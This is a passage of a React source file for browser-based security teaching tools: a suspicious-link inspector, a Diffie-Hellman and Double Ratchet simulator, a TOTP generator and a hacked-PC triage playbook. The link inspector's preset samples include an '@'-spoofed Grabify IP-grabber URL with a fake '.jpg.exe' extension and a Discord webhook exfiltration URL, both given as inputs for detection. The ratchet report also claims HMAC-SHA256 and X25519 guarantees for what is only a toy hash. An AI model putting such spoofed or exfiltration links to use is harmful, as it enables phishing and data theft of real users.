          <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
            {generatedCanary}
          </pre>
        </div>
      </div>

      {/* Part B: Suspicious URL / IP Grabber Unpacker */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Part B: Suspicious Link & IP Grabber Unpacker
          </span>
          <div className="flex gap-1.5">
            <button
              type="button"
              onClick={() =>
                setSuspectUrl(
                  "https://steamcommunity.com@grabify.link/IMG_8842.jpg.exe?ref=discord_webhook"
                )
              }
              className="rounded-xs border border-border bg-surface px-2 py-0.5 font-mono-code text-[10px] text-text-muted hover:text-text cursor-pointer"
            >
              Grabify + @ Spoof
            </button>
            <button
              type="button"
              onClick={() =>
                setSuspectUrl("https://discord.com/api/webhooks/120994821/a8f92bc_exfil_token")
              }
              className="rounded-xs border border-border bg-surface px-2 py-0.5 font-mono-code text-[10px] text-text-muted hover:text-text cursor-pointer"
            >
              Discord Webhook Exfil
            </button>
          </div>
        </div>

        <input
          type="text"
          value={suspectUrl}
          onChange={(e) => setSuspectUrl(e.target.value)}
          className="w-full rounded-xs border border-border bg-surface px-3 py-1.5 font-mono-code text-xs text-text"
        />

        <div className="space-y-1.5">
          <div className="text-xs font-mono-code text-text-muted">
            Actual Connecting Host:{" "}
            <span className="font-bold text-text">{urlInspection.host || "Invalid URL"}</span>
          </div>
          {urlInspection.flags.length === 0 ? (
            <div className="rounded-xs border border-emerald-500/30 bg-emerald-500/10 p-2 text-xs text-emerald-300">
              No known IP grabber domains or credential-spoofing tricks detected.
            </div>
          ) : (
            urlInspection.flags.map((f, i) => (
              <div
                key={i}
                className="rounded-xs border border-red-500/40 bg-red-500/10 p-2 text-xs text-red-300"
              >
                {f}
              </div>
            ))
          )}
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 8. DIFFIE-HELLMAN & SIGNAL DOUBLE RATCHET E2EE SIMULATOR
 * ========================================================================== */
function modPowBigInt(base: bigint, exp: bigint, mod: bigint): bigint {
  if (mod === 1n) return 0n;
  let result = 1n;
  let b = base % mod;
  let e = exp;
  while (e > 0n) {
    if (e % 2n === 1n) result = (result * b) % mod;
    e = e >> 1n;
    b = (b * b) % mod;
  }
  return result;
}

function pseudoHmacHex(keyHex: string, label: string): string {
  // Deterministic 32-char hex KDF visualizer for synchronous Double Ratchet state transitions
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193;
  const str = `${keyHex}:${label}`;
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    h1 = Math.imul(h1 ^ c, 0x01000193) >>> 0;
    h2 = Math.imul(h2 ^ (c + i * 17), 0x85ebca6b) >>> 0;
  }
  return (
    h1.toString(16).padStart(8, "0") +
    h2.toString(16).padStart(8, "0") +
    ((h1 ^ h2) >>> 0).toString(16).padStart(8, "0") +
    Math.imul(h1, 31).toString(16).slice(-8).padStart(8, "0")
  );
}

interface RatchetMessageStep {
  msgIndex: number;
  dhEpoch: number;
  rootKey: string;
  chainKey: string;
  messageKey: string;
  compromised: boolean;
}

function DiffieHellmanE2eeRatchetSimulator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [primeP, setPrimeP] = useState<number>(7919);
  const [genG, setGenG] = useState<number>(7);
  const [alicePriv, setAlicePriv] = useState<number>(1429);
  const [bobPriv, setBobPriv] = useState<number>(2857);
  const [dhEpoch, setDhEpoch] = useState<number>(1);
  const [compromisedIdx, setCompromisedIdx] = useState<number>(2);
  const [msgCount, setMsgCount] = useState<number>(4);

  useEffect(() => {
    if (resetTrigger > 0) {
      setPrimeP(7919);
      setGenG(7);
      setAlicePriv(1429);
      setBobPriv(2857);
      setDhEpoch(1);
      setCompromisedIdx(2);
      setMsgCount(4);
    }
  }, [resetTrigger]);

  const dhCalc = useMemo(() => {
    const p = BigInt(Math.max(5, primeP));
    const g = BigInt(Math.max(2, genG));
    const a = BigInt(Math.max(2, alicePriv));
    const b = BigInt(Math.max(2, bobPriv));
    const A = modPowBigInt(g, a, p);
    const B = modPowBigInt(g, b, p);
    const sAlice = modPowBigInt(B, a, p);
    const sBob = modPowBigInt(A, b, p);
    return { p, g, a, b, A, B, sAlice, sBob, match: sAlice === sBob };
  }, [primeP, genG, alicePriv, bobPriv]);

  const ratchetTimeline = useMemo(() => {
    const steps: RatchetMessageStep[] = [];
    let rk = pseudoHmacHex(dhCalc.sAlice.toString(), `RK_INIT_EPOCH_${dhEpoch}`);
    let ck = pseudoHmacHex(rk, `CK_INIT_${dhEpoch}`);

    for (let i = 1; i <= msgCount; i++) {
      // Every 3rd message or when dhEpoch advances, show DH ratchet rotation
      const ep = i >= 3 ? dhEpoch + 1 : dhEpoch;
      if (i === 3) {
        rk = pseudoHmacHex(rk, `DH_RATCHET_STEP_${ep}`);
        ck = pseudoHmacHex(rk, `NEW_CHAIN_KEY_${ep}`);
      }
      const mk = pseudoHmacHex(ck, `MSG_KEY_0x01_${i}`);
      steps.push({
        msgIndex: i,
        dhEpoch: ep,
        rootKey: rk,
        chainKey: ck,
        messageKey: mk,
        compromised: i === compromisedIdx,
      });
      ck = pseudoHmacHex(ck, `NEXT_CHAIN_KEY_0x02_${i}`);
    }
    return steps;
  }, [dhCalc.sAlice, dhEpoch, msgCount, compromisedIdx]);

  useEffect(() => {
    setOutput(
      [
        `=== DIFFIE-HELLMAN & SIGNAL DOUBLE RATCHET E2EE REPORT ===`,
        `Public Parameters: p = ${dhCalc.p}, g = ${dhCalc.g}`,
        `Alice Private a = ${dhCalc.a} -> Public A = g^a mod p = ${dhCalc.A}`,
        `Bob Private b   = ${dhCalc.b} -> Public B = g^b mod p = ${dhCalc.B}`,
        `Shared Secret: S_Alice = B^a mod p = ${dhCalc.sAlice} | S_Bob = A^b mod p = ${dhCalc.sBob} (Verified Match: ${dhCalc.match})`,
        ``,
        `--- SIGNAL DOUBLE RATCHET KEY SCHEDULE ---`,
        ...ratchetTimeline.map(
          (r) =>
            `Msg #${r.msgIndex} [DH Epoch ${r.dhEpoch}] | RK: ${r.rootKey.slice(0, 12)}... | CK: ${r.chainKey.slice(
              0,
              12
            )}... | MK: ${r.messageKey} ${
              r.compromised ? "<-- [SIMULATED COMPROMISED MESSAGE KEY]" : ""
            }`
        ),
        ``,
        `Forward Secrecy Proof: Compromising MK #${compromisedIdx} cannot invert HMAC-SHA256 to recover Msg #1..#${
          compromisedIdx - 1
        }.`,
        `Post-Compromise Security Proof: DH Ratchet turn at Msg #3 mixes fresh ephemeral X25519 entropy into Root Key, locking out attacker from future epochs.`,
      ].join("\n")
    );
  }, [dhCalc, ratchetTimeline, compromisedIdx, setOutput]);

  return (
    <div className="space-y-5">
      {/* Part 1: Diffie-Hellman Mathematical Exchange */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Key className="h-4 w-4 text-accent" />
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Part 1: Diffie-Hellman Key Exchange ($g^a \bmod p$)
            </span>
          </div>
          <span className="rounded-xs bg-emerald-500/20 px-2 py-0.5 font-mono-code text-[10px] font-bold text-emerald-300">
            Shared Secret S = {dhCalc.sAlice.toString()}
          </span>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Public Prime (p)
            </label>
            <input
              type="number"
              value={primeP}
              onChange={(e) => setPrimeP(Number(e.target.value) || 7919)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Generator (g)
            </label>
            <input
              type="number"
              value={genG}
              onChange={(e) => setGenG(Number(e.target.value) || 7)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Alice Private (a)
            </label>
            <input
              type="number"
              value={alicePriv}
              onChange={(e) => setAlicePriv(Number(e.target.value) || 1429)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-accent"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Bob Private (b)
            </label>
            <input
              type="number"
              value={bobPriv}
              onChange={(e) => setBobPriv(Number(e.target.value) || 2857)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-accent"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5 text-xs font-mono-code">
          <div className="rounded-xs border border-border bg-surface p-2.5">
            <div className="text-[10px] text-text-muted uppercase">Alice Sends Public A</div>
            <div className="font-bold text-text mt-0.5">
              A = {dhCalc.g.toString()}^{dhCalc.a.toString()} mod {dhCalc.p.toString()} ={" "}
              <span className="text-accent">{dhCalc.A.toString()}</span>
            </div>
          </div>
          <div className="rounded-xs border border-border bg-surface p-2.5">
            <div className="text-[10px] text-text-muted uppercase">Bob Sends Public B</div>
            <div className="font-bold text-text mt-0.5">
              B = {dhCalc.g.toString()}^{dhCalc.b.toString()} mod {dhCalc.p.toString()} ={" "}
              <span className="text-accent">{dhCalc.B.toString()}</span>
            </div>
          </div>
          <div className="rounded-xs border border-emerald-500/30 bg-emerald-500/10 p-2.5">
            <div className="text-[10px] text-emerald-300 uppercase">Identical Shared Secret</div>
            <div className="font-bold text-emerald-400 mt-0.5">
              B^a mod p = A^b mod p = {dhCalc.sAlice.toString()}
            </div>
          </div>
        </div>
      </div>

      {/* Part 2: Signal Double Ratchet Visual Chain */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Part 2: Signal Double Ratchet (KDF Chain + Ephemeral DH Ratchet)
          </span>
          <div className="flex flex-wrap gap-1.5">
            <button
              type="button"
              onClick={() => setMsgCount((n) => Math.min(8, n + 1))}
              className="rounded-xs bg-[#ff6a00] px-2.5 py-1 font-heading text-[10px] font-bold uppercase text-white cursor-pointer"
            >
              + Step Symmetric KDF Ratchet
            </button>
            <button
              type="button"
              onClick={() => setDhEpoch((e) => e + 1)}
              className="rounded-xs border border-border bg-surface px-2.5 py-1 font-heading text-[10px] font-bold uppercase text-text hover:border-accent cursor-pointer"
            >
              Rotate Ephemeral DH Keypair (Epoch #{dhEpoch})
            </button>
          </div>
        </div>

        <p className="text-xs text-text-muted">
          Click any message card below to simulate an attacker stealing that specific{" "}
          <code className="font-mono-code text-accent">Message Key (MK)</code>:
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
          {ratchetTimeline.map((r) => {
            const isPast = r.msgIndex < compromisedIdx;
            const isHealed = r.dhEpoch > ratchetTimeline[compromisedIdx - 1]?.dhEpoch;
            return (
              <div
                key={r.msgIndex}
                onClick={() => setCompromisedIdx(r.msgIndex)}
                className={`rounded-xs border p-3 transition cursor-pointer ${
                  r.compromised
                    ? "border-red-500 bg-red-500/15"
                    : isPast
                    ? "border-emerald-500/40 bg-emerald-500/5"
                    : isHealed
                    ? "border-emerald-500/40 bg-emerald-500/10"
                    : "border-border bg-surface"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-heading text-xs font-bold text-text">
                    Message #{r.msgIndex} (DH Epoch #{r.dhEpoch})
                  </span>
                  <span
                    className={`rounded-xs px-1.5 py-0.5 font-mono-code text-[10px] font-bold ${
                      r.compromised
                        ? "bg-red-500/30 text-red-300"
                        : isPast
                        ? "bg-emerald-500/20 text-emerald-300"
                        : isHealed
                        ? "bg-emerald-500/20 text-emerald-300"
                        : "bg-amber-500/20 text-amber-300"
                    }`}
                  >
                    {r.compromised
                      ? "COMPROMISED MK"
                      : isPast
                      ? "SAFE (Forward Secrecy)"
                      : isHealed
                      ? "HEALED (DH Ratchet)"
                      : "Same Epoch"}
                  </span>
                </div>
                <div className="mt-1.5 space-y-0.5 font-mono-code text-[11px] text-text-muted">
                  <div>RK: {r.rootKey.slice(0, 16)}...</div>
                  <div>CK: {r.chainKey.slice(0, 16)}...</div>
                  <div className="text-text font-bold">MK: {r.messageKey.slice(0, 20)}...</div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 9. TOTP / HOTP 2FA AUTHENTICATOR & CLOCK-DRIFT SIMULATOR
 * ========================================================================== */
const BASE32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

function decodeBase32(input: string): Uint8Array {
  const clean = input.toUpperCase().replace(/[^A-Z2-7]/g, "");
  let bits = 0;
  let value = 0;
  const out: number[] = [];
  for (let i = 0; i < clean.length; i++) {
    const idx = BASE32_ALPHABET.indexOf(clean[i]);
    if (idx === -1) continue;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      out.push((value >>> (bits - 8)) & 0xff);
      bits -= 8;
    }
  }
  return new Uint8Array(out.length ? out : [0]);
}

async function computeTotpWindow(
  secretBase32: string,
  counterBigInt: bigint,
  digits: number,
  algo: "SHA-1" | "SHA-256"
): Promise<{ code: string; hmacHex: string; offset: number; CounterHex: string }> {
  const keyBytes = decodeBase32(secretBase32);
  const counterBytes = new Uint8Array(8);
  let c = counterBigInt;
  for (let i = 7; i >= 0; i--) {
    counterBytes[i] = Number(c & 0xffn);
    c >>= 8n;
  }
  const counterHex = Array.from(counterBytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");

  const cryptoKey = await window.crypto.subtle.importKey(
    "raw",
    keyBytes.buffer as ArrayBuffer,
    { name: "HMAC", hash: { name: algo } },
    false,
    ["sign"]
  );
  const sig = await window.crypto.subtle.sign("HMAC", cryptoKey, counterBytes.buffer as ArrayBuffer);
  const hmac = new Uint8Array(sig);
  const hmacHex = Array.from(hmac)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");

  const offset = hmac[hmac.length - 1] & 0x0f;
  const binary =
    ((hmac[offset] & 0x7f) << 24) |
    ((hmac[offset + 1] & 0xff) << 16) |
    ((hmac[offset + 2] & 0xff) << 8) |
    (hmac[offset + 3] & 0xff);
  const mod = Math.pow(10, digits);
  const code = (binary % mod).toString().padStart(digits, "0");

  return { code, hmacHex, offset, CounterHex: counterHex };
}

function TotpHotp2faAuthenticatorSimulator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [secret, setSecret] = useState("JBSWY3DPEHPK3PXP");
  const [issuer, setIssuer] = useState("ZeroUniverse");
  const [account, setAccount] = useState("secops@zerosuniverse.com");
  const [digits, setDigits] = useState<6 | 8>(6);
  const [period, setPeriod] = useState<30 | 60>(30);
  const [algo, setAlgo] = useState<"SHA-1" | "SHA-256">("SHA-1");
  const [driftSec, setDriftSec] = useState<number>(0);
  const [nowEpoch, setNowEpoch] = useState<number>(() => Math.floor(Date.now() / 1000));
  const [windows, setWindows] = useState<{
    prev: string;
    curr: string;
    next: string;
    hmacHex: string;
    offset: number;
    counterHex: string;
  }>({
    prev: "------",
    curr: "------",
    next: "------",
    hmacHex: "",
    offset: 0,
    counterHex: "0000000000000000",
  });

  useEffect(() => {
    if (resetTrigger > 0) {
      setSecret("JBSWY3DPEHPK3PXP");
      setDigits(6);
      setPeriod(30);
      setAlgo("SHA-1");
      setDriftSec(0);
    }
  }, [resetTrigger]);

  useEffect(() => {
    const timer = setInterval(() => {
      setNowEpoch(Math.floor(Date.now() / 1000));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const adjustedEpoch = nowEpoch + driftSec;
  const currentCounter = BigInt(Math.floor(adjustedEpoch / period));
  const secondsRemaining = period - (adjustedEpoch % period);

  useEffect(() => {
    let cancelled = false;
    async function run() {
      try {
        const [p, c, n] = await Promise.all([
          computeTotpWindow(secret, currentCounter - 1n, digits, algo),
          computeTotpWindow(secret, currentCounter, digits, algo),
          computeTotpWindow(secret, currentCounter + 1n, digits, algo),
        ]);
        if (!cancelled) {
          setWindows({
            prev: p.code,
            curr: c.code,
            next: n.code,
            hmacHex: c.hmacHex,
            offset: c.offset,
            counterHex: c.CounterHex,
          });
        }
      } catch {
        // ignore
      }
    }
    run();
    return () => {
      cancelled = true;
    };
  }, [secret, currentCounter, digits, algo]);

  const otpauthUri = useMemo(
    () =>
      `otpauth://totp/${encodeURIComponent(issuer)}:${encodeURIComponent(
        account
      )}?secret=${secret.replace(/\s+/g, "")}&issuer=${encodeURIComponent(
        issuer
      )}&algorithm=${algo.replace("-", "")}&digits=${digits}&period=${period}`,
    [issuer, account, secret, algo, digits, period]
  );

  const generateRandomBase32 = () => {
    const bytes = new Uint8Array(20);
    window.crypto.getRandomValues(bytes);
    let out = "";
    for (let i = 0; i < 16; i++) {
      out += BASE32_ALPHABET[bytes[i] & 31];
    }
    setSecret(out);
  };

  useEffect(() => {
    setOutput(
      [
        `=== RFC 6238 TOTP / HOTP 2FA AUTHENTICATOR REPORT ===`,
        `Base32 Secret: ${secret} | Algorithm: HMAC-${algo} | Digits: ${digits} | Period: ${period}s`,
        `Effective Unix Epoch: ${adjustedEpoch} (Drift: ${driftSec >= 0 ? `+${driftSec}s` : `${driftSec}s`})`,
        `8-Byte Time Counter: 0x${windows.counterHex}`,
        `HMAC Digest: ${windows.hmacHex}`,
        `Dynamic Truncation Offset: byte[${windows.offset}..${windows.offset + 3}]`,
        ``,
        `Previous Window (-${period}s): ${windows.prev}`,
        `Current Token   (Active): ${windows.curr} (expires in ${secondsRemaining}s)`,
        `Next Window     (+${period}s): ${windows.next}`,
        ``,
        `Provisioning URI: ${otpauthUri}`,
      ].join("\n")
    );
  }, [secret, algo, digits, period, adjustedEpoch, driftSec, windows, secondsRemaining, otpauthUri, setOutput]);

  return (
    <div className="space-y-5">
      {/* Secret & Parameters */}
      <div className="grid grid-cols-1 md:grid-cols-12 gap-3">
        <div className="md:col-span-5">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Base32 Shared Secret (RFC 4648)
          </label>
          <div className="flex gap-1.5">
            <input
              type="text"
              value={secret}
              onChange={(e) => setSecret(e.target.value.toUpperCase())}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-accent font-bold"
            />
            <button
              type="button"
              onClick={generateRandomBase32}
              className="rounded-xs border border-border bg-background px-2.5 py-1.5 text-text-muted hover:border-accent hover:text-accent cursor-pointer"
              title="Generate Random Base32 Secret"
            >
              <RefreshCw className="h-3.5 w-3.5" />
            </button>
          </div>
        </div>
        <div className="md:col-span-3">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            HMAC Algorithm
          </label>
          <select
            value={algo}
            onChange={(e) => setAlgo(e.target.value as "SHA-1" | "SHA-256")}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value="SHA-1">HMAC-SHA1 (RFC 6238 Default)</option>
            <option value="SHA-256">HMAC-SHA256</option>
          </select>
        </div>
        <div className="md:col-span-2">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Digits
          </label>
          <select
            value={digits}
            onChange={(e) => setDigits(Number(e.target.value) as 6 | 8)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value={6}>6 Digits</option>
            <option value={8}>8 Digits</option>
          </select>
        </div>
        <div className="md:col-span-2">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Clock Skew (s)
          </label>
          <input
            type="number"
            min={-120}
            max={120}
            step={15}
            value={driftSec}
            onChange={(e) => setDriftSec(Number(e.target.value) || 0)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      {/* Live 3-Window Display */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-4 text-center">
          <div className="font-heading text-[10px] font-bold uppercase text-text-muted">
            Previous Window (-{period}s)
          </div>
          <div className="mt-1 font-mono-code text-xl font-bold text-text-muted tracking-widest">
            {windows.prev}
          </div>
        </div>
        <div className="rounded-xs border-2 border-[#ff6a00] bg-background p-4 text-center space-y-2">
          <div className="flex items-center justify-between text-[10px] font-heading font-bold uppercase text-accent">
            <span>Current TOTP Token</span>
            <span className="font-mono-code">{secondsRemaining}s left</span>
          </div>
          <div className="font-mono-code text-3xl font-bold text-text tracking-widest">
            {windows.curr}
          </div>
          <div className="h-1.5 w-full rounded-xs bg-surface overflow-hidden">
            <div
              className="h-full bg-[#ff6a00] transition-all duration-500"
              style={{ width: `${(secondsRemaining / period) * 100}%` }}
            />
          </div>
        </div>
        <div className="rounded-xs border border-border bg-background p-4 text-center">
          <div className="font-heading text-[10px] font-bold uppercase text-text-muted">
            Next Window (+{period}s)
          </div>
          <div className="mt-1 font-mono-code text-xl font-bold text-text-muted tracking-widest">
            {windows.next}
          </div>
        </div>
      </div>

      {/* Dynamic Truncation & otpauth URI */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2 text-xs font-mono-code">
        <div className="flex items-center justify-between">
          <span className="text-text-muted">8-Byte Counter Hex:</span>
          <span className="text-text">0x{windows.counterHex}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-text-muted">Dynamic Truncation (Offset {windows.offset}):</span>
          <span className="text-accent truncate max-w-[420px]">{windows.hmacHex}</span>
        </div>
        <div className="pt-2 border-t border-border flex items-center justify-between gap-2">
          <span className="truncate text-text-muted">{otpauthUri}</span>
          <InlineCopyButton text={otpauthUri} label="Copy otpauth URI" />
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 10. HACKED PC INCIDENT RESPONSE & TRIAGE PLAYBOOK SIMULATOR
 * ========================================================================== */
interface IncidentSymptom {
  id: string;
  title: string;
  threatClass: "Ransomware" | "RAT / Remote Access" | "Infostealer / Drainer" | "BEC / Account Takeover" | "Cryptominer";
  severity: number;
  powerAdvice: string;
  forensicCmd: string;
  playbookStep: string;
}

const IR_SYMPTOMS: IncidentSymptom[] = [
  {
    id: "ransom_ext",
    title: "Files renamed with .locked/.enc extension + README_RESTORE.txt ransom note",
    threatClass: "Ransomware",
    severity: 45,
    powerAdvice:
      "PULL ETHERNET / DISABLE WI-FI IMMEDIATELY to halt SMB/NAS lateral encryption. Keep RAM alive only if capturing memory dump; otherwise isolate host.",
    forensicCmd: `vssadmin list shadows; Get-Process | Sort-Object CPU -Descending | Select -First 15`,
    playbookStep:
      "Isolate network interfaces immediately, disconnect mapped SMB/NAS shares, check NoMoreRansom.org before wiping, and restore from immutable offline backups.",
  },
  {
    id: "rat_mouse",
    title: "Cursor moving on its own, unexpected AnyDesk/ScreenConnect tray icon, or webcam active",
    threatClass: "RAT / Remote Access",
    severity: 40,
    powerAdvice:
      "SEVER NETWORK CONNECTION IMMEDIATELY (unplug RJ45 / toggle Airplane mode). Do NOT reboot yet so active C2 socket PIDs remain in netstat.",
    forensicCmd: `netstat -ano | findstr ESTABLISHED; Get-CimInstance Win32_Process | Select ProcessId,Name,CommandLine`,
    playbookStep:
      "Capture active ESTABLISHED remote IP/PID via netstat, audit Startup/Scheduled Tasks and rogue RMM services (ScreenConnect/AnyDesk), then rotate all credentials from a clean device.",
  },
  {
    id: "infostealer_cookie",
    title: "Browser session cookies hijacked (2FA bypassed on Gmail/Discord/Crypto wallet drained)",
    threatClass: "Infostealer / Drainer",
    severity: 35,
    powerAdvice:
      "Isolate infected PC; use a separate clean phone/laptop to click 'Sign out of all active sessions' and rotate passwords + revoke OAuth tokens.",
    forensicCmd: `dir /s /b "%LOCALAPPDATA%\\Temp\\*.exe"; Get-MpThreatDetection`,
    playbookStep:
      "Invalidate server-side session cookies by logging out all devices, transfer remaining crypto assets to a fresh hardware-wallet seed phrase, and perform a clean OS USB reinstall.",
  },
  {
    id: "email_forwarding",
    title: "Hidden email auto-forwarding/delete rules for 'bank'/'invoice'/'reset' messages",
    threatClass: "BEC / Account Takeover",
    severity: 30,
    powerAdvice:
      "Cloud/Account-level compromise: inspect Inbox Rules, POP/IMAP forwarding, and Enterprise OAuth App consents immediately.",
    forensicCmd: `# Check Gmail/M365 Settings -> Forwarding & Inbox Rules -> OAuth Third-Party Apps`,
    playbookStep:
      "Delete attacker inbox rules, revoke unknown OAuth tokens, verify carrier SIM-swap lock, and enable FIDO2/Passkey hardware 2FA.",
  },
  {
    id: "gpu_miner",
    title: "100% GPU/CPU fan spin at idle that drops to 0% as soon as Task Manager opens",
    threatClass: "Cryptominer",
    severity: 22,
    powerAdvice:
      "Use Process Explorer (Sysinternals) instead of standard Task Manager (stealth miners watch for taskmgr.exe process creation).",
    forensicCmd: `schtasks /query /fo LIST /v | findstr /i "powershell cmd appdata"`,
    playbookStep:
      "Inspect WMI Event Subscriptions and Scheduled Tasks with Sysinternals Autoruns, remove persistence, and verify Windows Defender exclusions list (`Get-MpPreference`).",
  },
];

function HackedPcIncidentResponseSimulator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [selectedSymptoms, setSelectedSymptoms] = useState<string[]>([
    "rat_mouse",
    "infostealer_cookie",
  ]);
  const [osPlatform, setOsPlatform] = useState<"Windows 11/10" | "macOS" | "Linux">("Windows 11/10");

  useEffect(() => {
    if (resetTrigger > 0) {
      setSelectedSymptoms(["rat_mouse", "infostealer_cookie"]);
      setOsPlatform("Windows 11/10");
    }
  }, [resetTrigger]);

  const toggleSymptom = (id: string) => {
    setSelectedSymptoms((prev) =>
      prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]
    );
  };

  const triage = useMemo(() => {
    const active = IR_SYMPTOMS.filter((s) => selectedSymptoms.includes(s.id));
    const score = Math.min(100, active.reduce((acc, s) => acc + s.severity, 0));
    const priority =
      score >= 60 ? "P1 CRITICAL — ACTIVE INTRUSION / CONTAIN IMMEDIATELY" : score >= 30 ? "P2 HIGH — COMPROMISE CONFIRMED" : "P3 MODERATE — SUSPICIOUS ANOMALY";
    return { active, score, priority };
  }, [selectedSymptoms]);

  useEffect(() => {
    setOutput(
      [
        `=== EMERGENCY INCIDENT RESPONSE TRIAGE PLAYBOOK ===`,
        `Target OS: ${osPlatform} | Severity Score: ${triage.score}/100 | Status: ${triage.priority}`,
        ``,
        `--- GOLDEN-HOUR CONTAINMENT & VOLATILE EVIDENCE ---`,
        ...triage.active.map(
          (s, i) =>
            `${i + 1}. [${s.threatClass}] ${s.title}\n   Action: ${s.powerAdvice}\n   Forensic Cmd: ${s.forensicCmd}\n   Recovery: ${s.playbookStep}`
        ),
      ].join("\n")
    );
  }, [osPlatform, triage, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <AlertTriangle className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Interactive Compromised Host Symptom Triage
          </span>
        </div>
        <div className="flex gap-1.5">
          {(["Windows 11/10", "macOS", "Linux"] as const).map((os) => (
            <button
              key={os}
              type="button"
              onClick={() => setOsPlatform(os)}
              className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase cursor-pointer ${
                osPlatform === os
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted"
              }`}
            >
              {os}
            </button>
          ))}
        </div>
      </div>

      {/* Symptom Selection */}
      <div className="grid grid-cols-1 gap-2.5">
        {IR_SYMPTOMS.map((sym) => {
          const checked = selectedSymptoms.includes(sym.id);
          return (
            <button
              key={sym.id}
              type="button"
              onClick={() => toggleSymptom(sym.id)}
              className={`rounded-xs border p-3 text-left transition cursor-pointer ${
                checked
                  ? "border-red-500/60 bg-red-500/10"
                  : "border-border bg-background hover:border-accent"
              }`}
            >
              <div className="flex items-center justify-between gap-2">
                <span className="font-heading text-xs font-bold text-text">{sym.title}</span>
                <span className="rounded-xs bg-surface px-2 py-0.5 font-mono-code text-[10px] font-bold text-accent">
                  {sym.threatClass}
                </span>
              </div>
              {checked && (
                <div className="mt-2 space-y-1 text-xs">
                  <div className="text-amber-300 font-semibold">{sym.powerAdvice}</div>
                  <div className="font-mono-code text-[11px] text-emerald-400">
                    Cmd: {sym.forensicCmd}
                  </div>
                </div>
              )}
            </button>
          );
        })}
      </div>

      {/* Ordered Playbook Output */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-2.5">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Customized Incident Containment & Recovery Playbook
          </span>
          <span className="font-mono-code text-xs font-bold text-red-400">{triage.priority}</span>
        </div>
        <ol className="list-decimal list-inside space-y-1.5 text-xs text-text leading-relaxed">
          <li>
            <strong>Network Isolation:</strong> Disconnect Ethernet cable and disable Wi-Fi/Bluetooth immediately before attackers wipe logs or encrypt network shares.
          </li>
          <li>
            <strong>Volatile Evidence Triage:</strong> Capture active sockets (<code className="font-mono-code text-accent">netstat -ano</code>) and process command lines before powering off.
          </li>
          {triage.active.map((s) => (
            <li key={s.id}>
              <strong>{s.threatClass} Remediation:</strong> {s.playbookStep}
            </li>
          ))}
          <li>
            <strong>Clean-Device Credential Reset:</strong> Rotate passwords, revoke active session cookies, and re-enroll FIDO2 2FA from an uncompromised device.
          </li>
        </ol>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
